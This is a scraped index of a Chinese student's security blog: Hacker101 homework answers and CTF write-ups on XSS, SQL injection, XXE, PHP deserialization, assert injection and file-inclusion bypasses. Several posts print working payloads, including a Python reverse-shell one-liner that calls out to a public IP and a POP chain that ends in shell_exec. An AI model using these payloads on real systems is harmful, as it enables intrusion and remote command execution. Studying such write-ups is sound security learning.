!&lt;/h1&gt;&quot;;中hello后的值被控制。 ​ 这段参数没有进行任何的过滤，使得hello后的html字段可以由客户端任意控制，形成xss漏洞。由于内容只与用户提交的参数有关，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），故为反射型xss漏洞。 4.思考：现实中如何利用xss漏洞实施攻击，我们应该如何预防？（1分） 现实中实施攻击……关键在于参数的隐藏，可以进行url编码；如果还是可疑，可以利用网页上的网址缩短工具或绑定到一个看起来正常的网址……大概？攻击的投放可以通过邮件、广告、借助评论或图片上传链接、钓鱼网站……（都没实战过 预防……可以通过严格的过滤和应用CSP来阻止xss的产生，HttpOnly好像可以防止cookie窃取……","link":"/2021/04/13/hacker101-0/"},{"title":"hacker101.1","text":"hacker101.12.观看视频二，回答下列问题： 视频二：https://www.hacker101.com/sessions/pentest_owasp 1.目前owasp的十大web安全漏洞是哪些？这些漏洞排名是按照漏洞的严重程度排序的还是按照漏洞的常见程度排序的？（2分） 中文PDF-2017 注入漏洞：Injection 身份认证失效：Broken Authentication 敏感数据泄露：Sensitive Data Exposure XML外部实体漏洞：XML External Entities (XXE) 访问控制失效：Broken Access Control 安全配置错误：Security Misconfigurations 跨站脚本攻击：Cross-Site Scripting (XSS) 不安全的反序列化：Insecure Deserialization 使用含有已知漏洞的组件：Using Components with Known Vulnerabilities 日志和监控不足：Insufficient Logging and Monitoring OWASP Top 10 is a ranking of the ten most dangerous information security risks for web applications, compiled by a community of industry experts. For each point of the rating, the risk is calculated by experts based on theOWASP Risk Rating Methodologyand includes an assessment of Weakness Prevalence, Weakness Detectability and Exploitability, as well as the criticality of the consequences of their operation or Technical Impacts. 前10大风险项是根据流行数据选择和优先排序，并结合了对可利用性、可检测性和影响程度的一致性评估而形成。 2.请翻译一下credential stuffing（1分） ​ one that’s really common from a pentesting perspective is what we call credential stuffing. And say that we go out we grab data from breached data that’s out there so an account that’s been compromised the list shows up on the internet and now, the hackers have access to usernames and passwords and say we are testing in some website. ​ we just send usernames and passwords to an application ,and there’s no threat detection we’re just able to pound a login form or even use something like password spraying where we just take something like spring 2019 or summer 2020 exclamation and just throw common credentials out there and see if it sticks if we’re able to continuously brute force an application without anything preventing us or any account lockouts. emm，实际上就是撞库吗…… 利用已泄露的账户信息在多个平台进行尝试，这种尝试很难被检测出来。不同的用户名与密码，甚至于手机号，身份证号等等敏感信息进行组合来尝试登录。可能用户在多个平台的账户与密码是相同的，这样就十分危险。 Credential Stuffing Attack Beyond credential stuffing 3.为什么说不充分的日志记录(insufficient logging)也算owasp十大漏洞的一种？他的危害性如何（2分） 之所以有很多入侵行为发生，其中原因之一是没有行为监管，或监管不充分。入侵者r进入系统然而没有日志记录这一行为，或日志记录不充分。 所以，在做一些项目时，检查日志与监控是十分重要的。不充分的日志记录与监管可能会导致很多入侵行为的发生。 4.请翻阅一下owasp testing guide，以及owasp testing guide check-list，视频说怎么结合这两个文档来学习渗透测试？ 结合你平时渗透过程中的经验，谈谈你的感想。（3分） 中文版testing-guide https://github.com/tanprathan/OWASP-Testing-Checklist 从testing guide中，我们可以了解到所有的不同的渗透测试一个网站应用的方法。check-list可以提供我们在测试中所有要检查的点，并为这些点提供测试工具。check-list中的测试点可拿到testing guide中检索得到更为详尽的信息与总结，search engine、operator……and step by step。 emmm，速查与教科书的关系……？渗透测试是开卷的，速查与教科书就显得十分重要…… 我们需要清楚应用工作的方式，熟悉测试的逻辑，而check-list和testing-guide负责帮助我们理顺逻辑并记忆基础测试点。 从思考与逻辑出发，最终落实到check-list and testing-guide。check-list and testing-guide帮助我们查漏补缺。 you are only as good as you notes you are only as good as things you can refer to结合这两句话谈谈你的感想。（2分） 挺好……owasp提供了很好的资源，各种test-guiding，hacker101也提供了很好的学习资源（包括英语…… 写博客这么长时间，感觉也确实有用。包括资料查找、记录payload、各种知识点……我们所记录的、可参考的东西是记忆可靠的延伸。","link":"/2021/04/24/hacker101-1/"},{"title":"ppppp好耶","text":"题目：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?phperror_reporting(0);highlight_file(__FILE__);class A{ public $A1; public $A2; public function __call($name,$param) { if($this-&gt;{$name}) { $A3 = $this-&gt;{$name}; $A3(); } } public function __get($wuhu) { return $this-&gt;A2[$wuhu]; }}class B{ public $B1; public $B2; public function __destruct() { $this-&gt;B1-&gt;godmi(); }} class C{ public $C1; public $C2; public $C3; public function __invoke() { $this-&gt;C2 = $this-&gt;C3.$this-&gt;C1; } }class D{ public $D1; public function FLAG() { echo 'DDDD'; shell_exec($this-&gt;D1); }}class E{ public $E1; public $E2; public function __toString() { $this-&gt;E1-&gt;{$this-&gt;E2}(); return &quot;1&quot;; }}$ppppp = $_POST['Troy3e'];unserialize($ppppp);?&gt; 反序列化步骤很多魔术方法，需要根据逻辑构造pop链： 这里唯一可以自动调用的是B的destruct，在php脚本结束时自动调用 1234public function __destruct() { $this-&gt;B1-&gt;godmi(); } 这里调用了一个不存在的函数：米神函数，对应的是__call方法，$name和$param对应的是调用中不存在的函数名和参数。B(destruct)-&gt;A(call) call中有一个if判断： 12345if($this-&gt;{$name}) { $A3 = $this-&gt;{$name}; $A3(); } 调用了A中的{$name}属性，{}解释器会解释为godmi，就是调用了A中的godmi属性，而此属性不存在，对应的是 __get方法。B(destruct)-&gt;A(call)-&gt;A(get) 1234public function __get($wuhu) { return $this-&gt;A2[$wuhu]; } $wuhu这里获取的是不存在的属性名，返回的是A2[godmi]。这里要控制的A2[godmi]关联到： 12345678910111213141516171819public function __call($name,$param) { if($this-&gt;{$name}) { $A3 = $this-&gt;{$name}; $A3(); } }class C{ public $C1; public $C2; public $C3; public function __invoke() { $this-&gt;C2 = $this-&gt;C3.$this-&gt;C1; } } 控制A2[godmi]便可控制A3为C的实例化，以函数方法调用C类，这里就会触发__invoke方法。而赋值操作中有一个拼接，按字符串形式处理，可以触发E的__toString方法。 B(destruct)-&gt;A(call)-&gt;A(get)-&gt;A(call)-&gt;C(invoke)-&gt;E(tostring) 12345public function __toString() { $this-&gt;E1-&gt;{$this-&gt;E2}(); return &quot;1&quot;; } 控制E1和E2，就可以调用D中的FLAG方法了！ pop： B(destruct)-&gt;A(call)-&gt;A(call)-&gt;C(invoke)-&gt;E(tostring)-&gt;D(FLAG)-&gt;shell_exec() 构造反序列化： 123456789101112131415$c=new C();$b=new B();$a=new A();$e=new E();$d=new D();$d-&gt;D1='你的命令';$e-&gt;E1=$d;$e-&gt;E2=&quot;FLAG&quot;;$c-&gt;C1=$e;$a-&gt;A2['godmi']=$c;$b-&gt;B1=$a;echo '&lt;br&gt;';echo serialize($b); 然后就差不多了，可以命令执行了，虽说后来换成了system…… 下面是我用shell_exec弹shell的过程，卡了两天才知道要用公网IP……果然还是cai…… 服务器部署netcat：翻了好几个博客总结的，用起来很丝滑： 1234567891011121314151617181920212223242526272829下载源码包：wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz解压安装包，tar -zxvf netcat-0.7.1.tar.gz移动文件到/usr/local下：mv netcat-0.7.1 /usr/local/netcat-0.7.1重命名：cd /usr/localmv netcat-0.7.1 netcat./configure --enable-DGAPING_SECURITY_HOLE编译：make安装：make install环境变量暂时未配置成功，但仍可使用，此时：sudo which nc 应可以看到 bin/nc使用bin/nc即可使用nc命令或者：wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gztar zxvf netcat-0.7.1.tar.gzcd netcat-0.7.1./configure --enable-DGAPING_SECURITY_HOLEmakemake install ： 反弹shell虽说靶机上有nc，但一直没有成功…… 这里推荐：https://xz.aliyun.com/t/5768#toc-3 很详细 php也可反弹，但是是瞬间反弹……这里用的是python反弹： 1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;139.224.100.60&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);' 远程服务器监听4444端口： 反弹成功 执行命令cat flag即可…… 好耶！白嫖阿里云服务器真香！！🐕 It is uneasy right??!","link":"/2021/03/26/ppppp%E5%A5%BD%E8%80%B6/"},{"title":"hacker101-2","text":"hacker101.2中文视频： 【FreeBuf字幕组】Hacker101白帽黑客进阶之路-Web工作机制 1.http报文的结构是什么？（1分） 一个HTTP请求报文由请求行（request line）、请求头部（request header）、空行和请求数据4个部分构成。 请求行数据格式由三个部分组成：请求方法、URI、HTTP协议版本，他们之间用空格分隔。 1GET / HTTP/1.1 #请求方法为GET，请求路径为根目录，1.1版本 请求头部紧跟着请求行，该部分主要是用于描述请求正文 1234567Host: hackerone.com Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close ##主要是用于说明请求源、连接类型、Cookie信息、可处理内容等 请求正文和请求头部通过一个空行进行隔开，一般用于存放POST请求类型的请求正文 1username=admin 2.什么是crlf？在http报文的哪个位置。（1分） 缩写 ASCⅡ转义 系统 ASCⅡ值 CR \\r MacIntosh（早期的Mac） 13 LF \\n Unix/Linux/Mac OS X 10 CR LF \\r\\n Windows CR：Carriage Return，对应ASCII中转义字符\\r，表示回车 LF：Linefeed，对应ASCII中转义字符\\n，表示换行 CRLF：Carriage Return &amp; Linefeed，\\r\\n，表示回车并换行 Windows操作系统采用两个字符来进行换行，即CRLF； Unix/Linux/Mac OS X操作系统采用单个字符LF来进行换行； MacIntosh操作系统（即早期的Mac操作系统）采用单个字符CR来进行换行。 Burp中，点击\\n即可看到报文中crlf的详细位置，据我目前的经验，crlf可用于csrf和http走私 …… 3.解释下这几个头的含义（5分）： head头： Host：表明请求将要发送至的实际主机 Accept：客户端浏览器可处理的MIME类型，设置用来指定响应类型 Cookie：包含客户端向服务器传递的cookie数据 Referer：表明请求具体来源于哪个页面的链接 Authorization：通常用来做一些token认证 4.cookie具有哪些特点，不同的域名和子域名对cookie有怎样的权限？Cookie的Secure和 HTTPOnly这两个flag分别有什么作用？请结合xss攻击来进行说明（3分） 若Set-Cookie指定Domain为xxx.com，那么xxx.com的子域名同样能够访问获取到这个Cookie。若指定Domain为某子域名(sub.xxx.com)，那么只有该子域名及其下级子域名才可以访问获得Cookie。 Cookie的Secure属性：这代表Cookie只能在HTTPS协议中传输 Cookie的HTTPOnly属性：确保cookie只能通过Web请求传输，而不能用JavaScript来读取访问。原本可用的document.cookie方法的JS脚本在打开HTTPOnly后无法读取cookie，cookie只在请求中传输。 5.简述本视频提到的xss绕过web防火墙的方案（5分） 利用浏览器与WAF对html解析方式不同的特点。&lt;script/xss src=xxxxxx&gt;在浏览器中，/会被解析为%20，而WAF仅仅认为这是一个script/xss样式。这样就绕过了WAF，而浏览器中该标签得以执行。 6.内容嗅探是什么？主要有哪些类型？请分别举例，主要用途是什么？在什么情况下可以利用这些漏洞？为什么facebook等网站需要使用不同的域名来存储图片？（5分） 内容嗅探（Content Sniffing） 浏览器在显示响应回来的请求文件或网页时，若不知道该文件或网页的具体文件内容（Content-Type），会启动内容嗅探机制。如：MIME Sniffing，它的原理是浏览器回显自动探测未知格式的请求文件类型。另：Encoding Sniffing，浏览器会自动检测未知格式文件的编码类型。通过对内容编码格式的一一匹配进行嗅探，后在浏览器中进行相应的解析显示。 在请求响应不具备恰当的MIME类型时，浏览器的具体检测和解析机制可能会导致对文件或图片的不正确解析，导致此类漏洞的发生与利用。 Encoding Sniffing则利用浏览器的自动识别而WAF难以支持的特点(如：UTF-7、UTF-32)完成攻击，之前做过一个xml转码完成攻击的题。 facebook使用子域来托管图片，防止因此类漏洞造成的xss攻击。即使攻击完成，获取到的也可能仅仅是子域下的一个cookie。 7.同源策略是什么？限制是什么？浏览器在遇到哪两种情况的时候会用到同源策略？如何放松SOP限制？放松SOP限制会对浏览器插件安全造成怎样的破坏？ 同源策略（SOP） https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy Web安全的基石。同源策略目的在于防止Web交互间的不安全行为。同源策略限制了跨域的资源访问。 限制：协议、端口号、主机（域名）必须相同。 不同域之间是通过XML的HTTP请求来实现交互的，也就是AJAX请求。SOP会限制来自iframe和windows属性的跨域访问和AJAX请求？所以当我们打开一个带有JS脚本的新窗口，由于SOP的影响，那么就无法对该窗口中的DOM元素实现访问。 弱化SOP：可以通过设置不同域之间的document.domain脚本来实现。这种方式可以让本质上不同源的子域实现互相通信与交互。或者，通过postMessage方法实现跨窗口通信。 破坏：跨域跨窗口的信息验证很少存在，而Web插件的内部消息处理经常是错误的。如：Chrome的拓展插件就存在SOP绕过漏洞。Chrome的拓展插件在浏览器准备的sandbox中受到了很多限制，所以这些插件常使用postMessage进行设计。当我们向插件发送信息时，可以通过跨窗口通信绕过SOP，实际上这已经破环了浏览器准备的sandbox，是由SOP弱化导致的漏洞。 8.csrf是什么？如何设计规避csrf？视频中提到的错误的csrf配置方法是什么？ CSRF（跨站请求伪造） 攻击者挟持受害者去访问由攻击者控制的网站。并以受害者身份执行请求、提交等恶意操作。 123456&lt;body onload=&quot;document.forms[0].submit()&quot;&gt;&lt;form action=&quot;xxxx&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;1000000&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;to&quot; value=&quot;1625&quot;&gt;&lt;/form&gt;&lt;/body&gt; 这样的请求直接发送至后端，而后端无法分请请求是否是伪造的。 我们可以使用CSRF-Token来规避此类攻击。Token随机生成并嵌入表单中（CSP……?哦，不一样…… 如： 1234&lt;form action=&quot;xxxx&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt; 视频中提到有Web应用通过加载csrf.js来生成token，泄露了token的生成方式，这是一种自毁的防御措施。 附加题：5、6两点主要利用的是由于服务端和客户端对同一信息的处理方式不同造成的漏洞，你还能举出相似的例子么？（1分） …………","link":"/2021/05/06/hacker101-2/"},{"title":"ics-05","text":"ics-051.题目：2.过程：题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统 题目里面就有设备维护中心这一个网页……点击发现有一个page参数，不是sql注入，大概是文件包含 ?page=php://filter/read=convert.base64-encode/resource=index.php 读取网页源码： preg_replace($pattern, $replacement, $subject) 作用： 搜索subject中匹配pattern的部分，以replacement的内容进行替换。 $pattern: 要搜索的模式，可以是字符串或一个字符串数组。 $replacement: 用于替换的字符串或字符串数组。 $subject: 要搜索替换的目标字符串或字符串数组。 学习一波preg_replace()的漏洞： preg_replace漏洞触发有两个前提： 1：第一个参数需要e标识符，有了它可以执行第二个参数的命令 2：第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令 查找flag所在的位置：&amp;rep=system(‘find+/+-name+flag.*’) ： &amp;rep=system(‘cat+s3chahahaDir/flag/flag.php’) 在页面render一直查不出来……还是要看源码：","link":"/2021/02/18/ics-05/"},{"title":"xctf-FlatScience","text":"xctf-FlatScience1.题目：2.过程：这道题………… 打开上面写着：Best Papers，最好的论文，链接了好多paper，还是全英的…… 查看robots.txt，找到login和admin页面，login页面源码发现注释： 我看不懂，但我…… 在一通乱试下，原来是在login.php?debug……大概是个所谓的调试界面吧 1234567891011121314151617181920212223242526&lt;?phpif(isset($_POST['usr']) &amp;&amp; isset($_POST['pw'])){ $user = $_POST['usr']; $pass = $_POST['pw']; $db = new SQLite3('../fancy.db'); $res = $db-&gt;query(&quot;SELECT id,name from Users where name='&quot;.$user.&quot;' and password='&quot;.sha1($pass.&quot;Salz!&quot;).&quot;'&quot;); if($res){ $row = $res-&gt;fetchArray(); } else{ echo &quot;&lt;br&gt;Some Error occourred!&quot;; } if(isset($row['id'])){ setcookie('name',' '.$row['name'], time() + 60, '/'); header(&quot;Location: /&quot;); die(); }}if(isset($_GET['debug']))highlight_file('login.php');?&gt; sqlite的注入： 使usr=admin’ or ‘1’=1发现页面跳转，cookie中有值为+admin的记录，本来想直接盲注，但发现sqlite似乎没有if function……学习一下sqlite的注入 dalao sqlite_master隐藏表： 字段：type/name/tbl_name/rootpage/sql type列记录了项目的类型，如table、index、view、trigger。 name列记录了项目的名称，如表名、索引名等。 tbl_name列记录所从属的表名，如索引所在的表名。对于表来说，该列就是表名本身。 rootpage列记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者NULL。 sql列记录创建该项目的SQL语句。 **sqlite_version()**：版本号 用order by 判断表有两列，换掉admin并union select 1，2可以看到cookie值变为+2， 那就不用盲注了。sqlite没有concat但有group_concat……害 123456查表名：usr=0' union select 1,(select tbl_name from sqlite_master where type='table')--查列名：usr=0' union select 1,(select sql from sqlite_master where type='table')--查数据：usr=0' union select 1,(select group_concat(hint) from Users)-- 结果： 1234567891011121314sql：CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))id： 1,2,3name： admin,fritze,hansipassword： 3fab54a50e770d830c0416df817567662a9dc85c , 54eae8935c90f467427f05e4ece82cf569f89507 , 34b0bb7c304949f9ff2fc101eef0f048be10d3bdhint： my fav word in my fav paper?!,my love is…?,the password is password 还在打谜语……大概是paper里有一个词是密码吧……查一波，发现这还涉及到pdf转txt…… 奈何太菜，脚本也看不懂，贴大佬链接吧： dalao2 dalao3 密码是：ThinJerboa wohaocai，6LCc6K+t5Lq65rua5Ye65ZOl6LCt5biC==","link":"/2021/03/04/xctf-FlatScience/"},{"title":"web2","text":"web21.题目2.过程：12345678910111213141516171819202122&lt;?php$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;function encode($str){ $_o=strrev($str); // echo $_o; for($_0=0;$_0&lt;strlen($_o);$_0++){ $_c=substr($_o,$_0,1); $__=ord($_c)+1; $_c=chr($__); $_=$_.$_c; } return str_rot13(strrev(base64_encode($_)));}highlight_file(__FILE__);/* 逆向加密算法，解密$miwen就是flag*/?&gt; 直接交代了源码，看过上一个混淆，这个看着就顺眼多了 根据代码，关键也就是截取字符使ASCII移位，最后rot13，base64…… 解密： 12345678910111213141516171819202122232425&lt;?php$a=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;function decode($str){ $_o=base64_decode(strrev(str_rot13($str))); for($_0=0;$_0&lt;strlen($_o);$_0++){ $_c=substr($_o,$_0,1); $__=ord($_c)-1; $_c=chr($__); $_=$_.$_c; } $_=strrev($_); return $_;}echo decode($a);?&gt; ok……","link":"/2021/03/18/web2/"},{"title":"xctf-unagi","text":"xctf-unagi1.题目：2.过程：进入题目是一个网站导航，有一个上传点： 上传新用户到系统……here中是： 大概是一个xml的界面，演示了xml格式的用户数据，也就是需要我们上传类似的xml文件来上传新用户。 about中提示，应当读取/flag文件 我一直很困惑于DTD这个东西，即使实体，也是规范…… 内部实体，规定了xml的几个元素，与元素的属性： 下面的xml数据需要根据DTD已有的定义（“规范”）来组织（这样的标签才会被正确解析？），DTD也可以是外部独立的，便于多个xml格式的文档引用 假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中： 1&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; eg： （include？ xxe的朴素运用，就是利用实体，读取内部敏感文件： 根据提示的xml结构，构造数据： 除了intro标签其他都有长度限制 intro标签可以在User界面找到 cred标签么有显示，大概是php代码不对这个标签识别 上传后发现有waf阻挡 绕过WAF保护的XXE中介绍了编码绕过，有效waf不支持一些编码，可以轻松绕过 https://mohemiv.com/tags/xxe/ 这个更详细，可惜全英…… 1iconv -f utf8 -t utf16 1.xml&gt;2.xml 转换后上传，即得到flag xxe深度学习 如果目标网站能访问外网，访问个人服务器上的dtd，操作大概会更多一些？……","link":"/2021/03/09/xctf-unagi/"},{"title":"强网杯-2019-随便注","text":"强网杯-2019-随便注1.过程 inject是注入点。 1?inject=1' order by 2--+ 测试发现有两列。 联合查询发现有过滤，大小写不能绕过： 1return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); ；不会报错，应该是堆叠注入？ 12show databases 查库show tables 查表 这两个表，可以看看。 123456789show columns from `words`//查看words表的结构（show full 显示表格详细信息）show columns from `1919810931114514`1919810931114514里面有flag的信息。默认查询的应该是words表。 那……预设的可能是 SELECT * FROM words WHERE inject='inject'………额，sql语句怎么改表名？ 查了一波资料，似乎有三种方法。 2.方法一.select绕过通过set、prepare、concat语句预设拼接好的select语句，运行即可。 12345?inject=1';SET @lgy=concat('sel','ect * from `1919810931114514`;');//concat可以拼接字符串PREPARE std from @lgy; //预设拼接后的语句，绕过select过滤execute std; //执行--+ //注释 对于预设语句也是有过滤……确实预设好像挺秀的…… 这个过滤用&amp;&amp;，还用strstr……用大小写绕过。 可以得到flag。 二.更改表名12345678rename table `words` to `ina`;rename table `1919810931114514` to `words`;结果是报错： Unknown column 'id' in 'where clause'预设查询的是where id =……但改完后表中没有这一列 alter table `words` change `flag` `id` varchar(100);//ALTER TABLE tiger (表名) CHANGE tigername(要修改的列) name (修改后的列名) VARCHAR(20)(类型);//VARCHAR(M)是一种比CHAR更加灵活的数据类型，同样用于表示字符数据，但是VARCHAR可以保存可变长度的字符串。其中M代表该数据类型所允许保存的字符串的最大长度。 再用?inject=-1’ or 1=1;就可以查出flag。 三.hander​ handler语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。 1234payload：1';handler `1919810931114514` open;handler `1919810931114514` read first;--+ 1flag{8138544e-d707-45a7-b56a-fc5e52a47572} ……确实可以，tqltql","link":"/2021/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"},{"title":"xctf-lottery","text":"xctf-lottery1.题目：2.过程：lottery，彩票网站…… 攻防世界直接给了附件，实际上题目存在/.git源码泄露： 很多php文件，有session的储存，但似乎不是flask session伪造，config里也没有key之类的……大部分操作都集成在api中，api接受json格式的数据。不像Hgame的微积分数学题，可以自动获取公式计算刷分，这里的彩票数字是随机的： 那网站哪里会出问题，既没有像样的用户登录，session似乎也没毛病…… 原来是php弱比较导致的漏洞： …… 直接遍历了输入的number，number的正常输入本应该为字符串，但json支持数组 注意，在使用==比较时，true是可以和任何类型的字符串或数字相等，返回true，当然0和false和null除外（true==0或true==false或true==null） 可以使用数组传入布尔值达到恒等： 刷钱买flag即可……","link":"/2021/03/10/xctf-lottery/"},{"title":"伪协议2","text":"1.题目1234567891011121314&lt;?phperror_reporting(0);echo '&lt;center&gt;&lt;strong&gt;针不戳，吃柠檬的感觉针不戳&lt;/strong&gt;&lt;/center&gt;';highlight_file(__FILE__);$file=$_GET['file'];if (isset($file)){ if(preg_match('/php|file|zip|bzip|zlib|base|data/i',$file)){ echo ('hacker!!!'); }else { $a=str_replace(&quot;troye&quot;,&quot;&quot;,$file); include $a; }}#不对劲，总感觉写错了啥，算了,继续吃柠檬~ 2.过程这次是大写也过滤了，没辙了…… 但是下面又有了新语句，$a=str_replace(“troye”,””,$file); 检测troye并从字符串中去掉，把troye混进去就可以绕过了。 payload：?file=PHtroyeP://filter/read=convert.BAStroyeE64-encode/resource=flag em，没了","link":"/2020/12/06/%E4%BC%AA%E5%8D%8F%E8%AE%AE2/"},{"title":"伪协议1","text":"1.题目1234567891011121314&lt;?phperror_reporting(0);echo '&lt;center&gt;&lt;strong&gt;针不戳，吃柠檬的感觉针不戳&lt;/strong&gt;&lt;/center&gt;';highlight_file(__FILE__);$file=$_GET['file'];if (isset($file)){ if(preg_match('/php|file|zip|bzip|zlib|base|data/',$file)){ echo ('hacker!!!'); }else { include $file; }}#不对劲，总感觉写错了啥，算了，先去吃柠檬~?&gt; 2.过程过滤掉了多个伪协议，但是对比伪协议2，没有过滤大写形式，这些协议似乎不区分大小写，那么通过大写绕过。 payload：?file=PHP://filter/read=convert.BASE64-encode/resource=flag 2.知识点： 伪协议似乎不区分大小写（？ file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 （很多还不是很会……） PHP://filter可以对中间流进行过滤，以多种方式编码后读取，使其不以php形式运行，读出数据 详细参考：https://segmentfault.com/a/1190000018991087","link":"/2020/12/06/%E4%BC%AA%E5%8D%8F%E8%AE%AE1/"},{"title":"极客大挑战-2019-BabySQL","text":"[极客大挑战 2019]BabySQL1.题目：2.过程：sql注入，含有一些过滤，测试一下： or被换掉了，应该可以双写绕过。#应该也被过滤了，本来想试试双写%23，但是%23好像就可以 ?username=1&amp;password=1’ oorr 1=1%23 ?username=1&amp;password=1’ ununionion selselectect 1,(selselectect group_concat(table_name) frofromm infoorrmation_schema.tables whwhereere table_schema=database()),3%23 ?username=1&amp;password=1’ ununionion selselectect 1,(selselectect group_concat(column_name) frofromm infoorrmation_schema.columns whwhereere table_name=’b4bsql’),3%23 这个or的替换真是处处可见…… ?username=1&amp;password=1’ ununionion selselectect 1,(selselectect group_concat(passwoorrd) frofromm b4bsql),3%23 flag{539ec27d-80a6-4381-a837-805f1b9b406e} 得到flag……","link":"/2021/02/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL/"},{"title":"极客大挑战-2019-BuyFlag","text":"[极客大挑战 2019]BuyFlag1.题目：https://buuoj.cn/challenges2.过程：进入题目是一个高大上的界面，有PAYFLAG界面…… 自从做过HGAME的智商检测，现在已经习惯性的去查cookie…… 这个user还是比较可疑的，先不管，查看源码有： 是一个绕过，但是我传了老久，就是没有回显……一直说我不是Cuit‘s students 把user改成1，就是了…… 后面就是两个绕过，password弱比较，money限制长度…… ok","link":"/2021/02/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag/"},{"title":"xctf-csaw-2016-quals-mfw","text":"xctf-csaw-2016-quals-mfw1.题目：2.过程：打开是一个网页，点击about： 题目提示使用了git，推测存在.git源码泄露： 访问发现网站目录，用GitHack获取源码： GitHack在python2下运行，使用方法：python2 GitHack.py [指定url] index.php： 12345678910111213if (isset($_GET['page'])) { $page = $_GET['page'];} else { $page = &quot;home&quot;;}$file = &quot;templates/&quot; . $page . &quot;.php&quot;;// I heard '..' is dangerous!assert(&quot;strpos('$file', '..') === false&quot;) or die(&quot;Detected hacking attempt!&quot;);// TODO: Make this look niceassert(&quot;file_exists('$file')&quot;) or die(&quot;That file doesn't exist!&quot;); 涉及到了assert的知识点： assert — 检查一个断言是否为 FALSE 如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 如本题：assert(“strpos(‘$file’, ‘..’) === false”) 执行了strpos函数对file进行了检查，若没有检查到..，则继续运行；若检查到，则抛出warning并die(“Detected hacking attempt!”)。 重点是对于assert函数的利用，控制file使之执行指定的代码。 eg：?page=’) or eval(“echo 9*9;”);// 不是很懂为什么会输出Detected hacking attempt!，本地尝试： ?page=’) or eval(“print(8*9);”);// 抑制住了疯狂报错……输出了bool（false），大概是语法或是什么地方出了一点问题……就挺迷的…… ?page=’) or system(“cat templates/flag.php”);// 得到flag 关于or可用点号替换的推测： 深入解析PHP中逗号与点号的区别 ……","link":"/2021/03/04/xctf-csaw-2016-quals-mfw/"},{"title":"极客大挑战-2019-Http","text":"[极客大挑战 2019]Http1.题目：Http头知识2.过程： 查看源码可以看到有一个Secret.php页面 用burpsuit修改http头： referrer：当一个用户点击当前页面中的一个链接，然后跳转到目标页面时，目标页面会收到一个信息，即用户是从哪个源链接跳转过来的。 User-Agent中记录了使用的浏览器信息 也就是要是本地ip X-Forwarded-For 是一个 HTTP 扩展头部，可用来伪造来源IP","link":"/2021/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http/"},{"title":"极客大挑战-2019-LoveSQL","text":"","link":"/2021/01/17/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/"},{"title":"极客大挑战-2019-PHP","text":"[极客大挑战 2019]PHP1.题目：2.过程：提醒有网页的备份，试出来是www.zip： 应该与序列化有关 大概是覆盖username和password，绕过wakeup后通过destruct得到flag，但是一直没有成功…… public、protected与private在序列化时的区别： protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上 \\0*\\0 的前缀，注意，这里的 \\0 表示 ASCII 码为 0的字符，也就是我们经过 urlencode 后看到的 %00 。private声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。 因此私有字段的字段名在序列化时，字段名前面会加上\\0\\0 的前缀， 这里 表示的是声明该私有字段的类的类名，而不是被序列化的对象的类名。因为声明该私有字段的类不一定是被序列化的对象的类，而有可能是它的祖先类。var 和 public声明的字段都是公共字段，因此它们的字段名的序列化格式是相同的。公共字段的字段名按照声明时的字段名进行序列化，但序列化后的字段名中不包括声明时的 变量前缀符号 $。 protected和private属性的变量会有一些不可见的字符 ​ 